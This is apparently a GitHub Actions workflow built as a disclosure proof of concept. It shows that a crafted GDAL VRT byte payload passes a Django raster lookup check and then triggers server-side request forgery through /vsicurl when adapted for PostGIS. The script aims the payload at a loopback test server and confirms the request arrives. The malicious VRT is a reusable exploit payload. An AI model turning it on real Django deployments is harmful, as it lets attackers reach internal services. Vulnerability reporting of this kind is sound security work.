name: Django GDAL VRT bytes SSRF PoC

on:
  push:
    branches:
      - h1-django-gdal-vrt-bytes-ssrf
  workflow_dispatch:

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.13"
      - name: Install GDAL/GEOS
        run: |
          sudo apt-get update
          sudo apt-get install -y gdal-bin libgdal-dev libgeos-dev
      - name: Install current Django
        run: |
          python -m pip install -U pip
          python -m pip install "Django @ git+https://github.com/django/django.git@9e06baf2e4dd17834b5deaf3a3e6ae3bff2fcf26" "psycopg[binary]"
      - name: Run loopback-only reproduction
        env:
          DJANGO_SETTINGS_MODULE: poc_settings
        run: |
          cat > poc_settings.py <<'PY'
          SECRET_KEY = "poc"
          INSTALLED_APPS = ["django.contrib.contenttypes", "django.contrib.gis"]
          DATABASES = {"default": {"ENGINE": "django.contrib.gis.db.backends.postgis", "NAME": "unused"}}
          PY
          cat > poc.py <<'PY'
          import threading
          from http.server import BaseHTTPRequestHandler, HTTPServer

          import django
          django.setup()

          from django.contrib.gis.gdal import GDALRaster
          from django.contrib.gis.db.models import RasterField
          from django.contrib.gis.db.backends.postgis.adapter import PostGISAdapter

          hits = []

          # Produce a valid 1x1 GeoTIFF entirely in /vsimem. This is what the
          # loopback server returns when the malicious VRT dereferences its source.
          src = GDALRaster({
              "name": "/vsimem/h1-source.tif",
              "driver": "GTiff",
              "width": 1,
              "height": 1,
              "srid": 4326,
              "origin": (0, 1),
              "scale": (1, -1),
              "bands": [{"data": [7]}],
          })
          src._flush()
          tiff_bytes = src.vsi_buffer

          class Handler(BaseHTTPRequestHandler):
              def do_HEAD(self):
                  hits.append(("HEAD", self.path))
                  self.send_response(200)
                  self.send_header("Content-Type", "image/tiff")
                  self.send_header("Content-Length", str(len(tiff_bytes)))
                  self.end_headers()

              def do_GET(self):
                  hits.append(("GET", self.path))
                  self.send_response(200)
                  self.send_header("Content-Type", "image/tiff")
                  self.send_header("Content-Length", str(len(tiff_bytes)))
                  self.end_headers()
                  self.wfile.write(tiff_bytes)

              def log_message(self, fmt, *args):
                  pass

          server = HTTPServer(("127.0.0.1", 18765), Handler)
          thread = threading.Thread(target=server.serve_forever, daemon=True)
          thread.start()

          vrt = b"""<VRTDataset rasterXSize="1" rasterYSize="1">
            <SRS>EPSG:4326</SRS>
            <GeoTransform>0,1,0,1,0,-1</GeoTransform>
            <VRTRasterBand dataType="Byte" band="1">
              <SimpleSource>
                <SourceFilename relativeToVRT="0">/vsicurl/http://127.0.0.1:18765/source.tif</SourceFilename>
                <SourceBand>1</SourceBand>
                <SourceProperties RasterXSize="1" RasterYSize="1" DataType="Byte" BlockXSize="1" BlockYSize="1"/>
                <SrcRect xOff="0" yOff="0" xSize="1" ySize="1"/>
                <DstRect xOff="0" yOff="0" xSize="1" ySize="1"/>
              </SimpleSource>
            </VRTRasterBand>
          </VRTDataset>"""

          # This is the security gate added for CVE-2026-15307.
          GDALRaster.check_raster_lookup_value(vrt)
          print("CHECK_RASTER_LOOKUP_VALUE=ALLOWED_BYTES")

          # This is the normal spatial lookup preparation path for a RasterField.
          field = RasterField(srid=4326)
          prepared = field.get_prep_value(vrt)
          print("PREPARED_DRIVER=", prepared.driver.name)
          print("HITS_AFTER_PREP=", hits)

          # PostGIS query parameter adaptation calls to_pgraster(), which calls
          # band.data() and therefore dereferences the VRT SourceFilename.
          adapter = PostGISAdapter(prepared)
          print("ADAPTER_BYTES=", len(adapter.ewkb))
          print("HTTP_HITS=", hits)

          server.shutdown()
          if not hits:
              raise SystemExit("FAIL: no loopback request observed")
          if not any(path == "/source.tif" for _, path in hits):
              raise SystemExit("FAIL: unexpected request path")
          print("POC_RESULT=SSRF_CONFIRMED")
          PY
          python poc.py
